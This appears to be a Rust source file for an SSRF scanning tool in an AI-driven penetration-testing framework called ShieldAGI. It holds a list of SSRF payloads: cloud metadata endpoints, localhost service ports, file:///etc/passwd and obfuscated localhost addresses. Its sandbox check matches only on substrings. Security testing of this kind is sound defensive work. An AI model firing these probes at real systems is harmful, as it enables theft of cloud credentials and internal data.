/// ShieldAGI Tool: ssrf_probe
///
/// Tests endpoints for Server-Side Request Forgery by probing internal IPs,
/// cloud metadata endpoints, and DNS rebinding vectors.

use serde::{Deserialize, Serialize};
use std::process::Command;

#[derive(Debug, Serialize, Deserialize)]
pub struct SsrfResult {
    pub target_url: String,
    pub parameter: String,
    pub vulnerable: bool,
    pub probes: Vec<SsrfProbe>,
    pub total_successful: usize,
    pub severity: String,
    pub scan_duration_ms: u64,
    pub error: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SsrfProbe {
    pub probe_url: String,
    pub probe_type: String,
    pub success: bool,
    pub status_code: Option<u16>,
    pub response_contains: Option<String>,
    pub detail: String,
}

/// Default SSRF probe targets — cloud metadata, internal services, localhost
const DEFAULT_PROBES: &[(&str, &str)] = &[
    // AWS metadata
    ("http://169.254.169.254/latest/meta-data/", "cloud-metadata-aws"),
    ("http://169.254.169.254/latest/user-data/", "cloud-userdata-aws"),
    // GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/", "cloud-metadata-gcp"),
    // Azure metadata
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cloud-metadata-azure"),
    // Localhost probes
    ("http://127.0.0.1:80/", "localhost-http"),
    ("http://127.0.0.1:22/", "localhost-ssh"),
    ("http://127.0.0.1:3306/", "localhost-mysql"),
    ("http://127.0.0.1:5432/", "localhost-postgres"),
    ("http://127.0.0.1:6379/", "localhost-redis"),
    ("http://127.0.0.1:27017/", "localhost-mongo"),
    // Internal network probes
    ("http://10.0.0.1/", "internal-10-network"),
    ("http://192.168.1.1/", "internal-192-network"),
    // File protocol
    ("file:///etc/passwd", "file-protocol"),
    ("file:///etc/hosts", "file-protocol-hosts"),
    // DNS rebinding / alternative representations
    ("http://0x7f000001/", "hex-localhost"),
    ("http://0177.0.0.1/", "octal-localhost"),
    ("http://2130706433/", "decimal-localhost"),
    ("http://[::1]/", "ipv6-localhost"),
    ("http://localhost:80/", "localhost-string"),
];

pub async fn tool_ssrf_probe(input: &serde_json::Value) -> Result<String, String> {
    let target_url = input["target_url"]
        .as_str()
        .ok_or("Missing 'target_url' field")?;

    if !is_sandbox_target(target_url) {
        return Err("SAFETY: ssrf_probe can only target sandbox URLs".into());
    }

    let parameter = input["parameter"]
        .as_str()
        .ok_or("Missing 'parameter' field")?;

    let method = input["method"].as_str().unwrap_or("POST");
    let cookie = input["cookie"].as_str();

    // Use custom probes if provided, otherwise defaults
    let custom_probes: Vec<(String, String)> = input["probes"]
        .as_array()
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(|s| (s.to_string(), "custom".to_string())))
                .collect()
        })
        .unwrap_or_default();

    let start = std::time::Instant::now();
    let mut probes = Vec::new();

    let probe_list: Vec<(&str, &str)> = if !custom_probes.is_empty() {
        custom_probes
            .iter()
            .map(|(url, ptype)| (url.as_str(), ptype.as_str()))
            .collect()
    } else {
        DEFAULT_PROBES.to_vec()
    };

    for (probe_url, probe_type) in &probe_list {
        let mut args = vec![
            "-s".to_string(),
            "-o".to_string(), "/dev/stdout".to_string(),
            "-w".to_string(), "\n%{http_code}".to_string(),
            "--max-time".to_string(), "5".to_string(),
            "-X".to_string(), method.to_string(),
        ];

        if method == "POST" {
            let body = format!("{}={}", parameter, probe_url);
            args.push("-d".to_string());
            args.push(body);
            args.push("-H".to_string());
            args.push("Content-Type: application/x-www-form-urlencoded".to_string());
        } else {
            // GET — append parameter to URL
            let separator = if target_url.contains('?') { "&" } else { "?" };
            let full_url = format!("{}{}{}={}", target_url, separator, parameter, probe_url);
            args.push(full_url);
        }

        if method == "POST" {
            args.push(target_url.to_string());
        }

        if let Some(c) = cookie {
            args.push("-b".to_string());
            args.push(c.to_string());
        }

        let args_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

        if let Ok(output) = Command::new("curl").args(&args_refs).output() {
            let full_output = String::from_utf8_lossy(&output.stdout);
            let lines: Vec<&str> = full_output.trim().rsplitn(2, '\n').collect();

            let status_code: Option<u16> = lines.first().and_then(|s| s.trim().parse().ok());
            let body = lines.last().unwrap_or(&"").to_string();

            // Determine if SSRF was successful
            let success = match status_code {
                Some(code) if code >= 200 && code < 400 => {
                    // Check for meaningful response content
                    !body.is_empty()
                        && !body.contains("error")
                        && !body.contains("not found")
                        && body.len() > 20
                }
                _ => false,
            };

            // Extract evidence from response
            let response_contains = if success {
                let truncated = if body.len() > 200 {
                    format!("{}...", &body[..200])
                } else {
                    body.clone()
                };
                Some(truncated)
            } else {
                None
            };

            probes.push(SsrfProbe {
                probe_url: probe_url.to_string(),
                probe_type: probe_type.to_string(),
                success,
                status_code,
                response_contains,
                detail: if success {
                    format!("Server fetched internal resource successfully")
                } else {
                    format!(
                        "Probe blocked or failed (HTTP {})",
                        status_code.unwrap_or(0)
                    )
                },
            });
        }
    }

    let duration = start.elapsed().as_millis() as u64;
    let total_successful = probes.iter().filter(|p| p.success).count();
    let vulnerable = total_successful > 0;

    let severity = if probes.iter().any(|p| p.success && p.probe_type.contains("cloud-metadata")) {
        "CRITICAL"
    } else if probes.iter().any(|p| p.success && p.probe_type.contains("file-protocol")) {
        "CRITICAL"
    } else if total_successful >= 3 {
        "HIGH"
    } else if total_successful >= 1 {
        "MEDIUM"
    } else {
        "LOW"
    };

    let result = SsrfResult {
        target_url: target_url.to_string(),
        parameter: parameter.to_string(),
        vulnerable,
        probes,
        total_successful,
        severity: severity.to_string(),
        scan_duration_ms: duration,
        error: None,
    };

    Ok(serde_json::to_string_pretty(&result).unwrap())
}

fn is_sandbox_target(url: &str) -> bool {
    url.contains("172.28.")
        || url.contains("shieldagi-")
        || url.contains("localhost:3001")
        || url.contains("vulnerable-app")
}
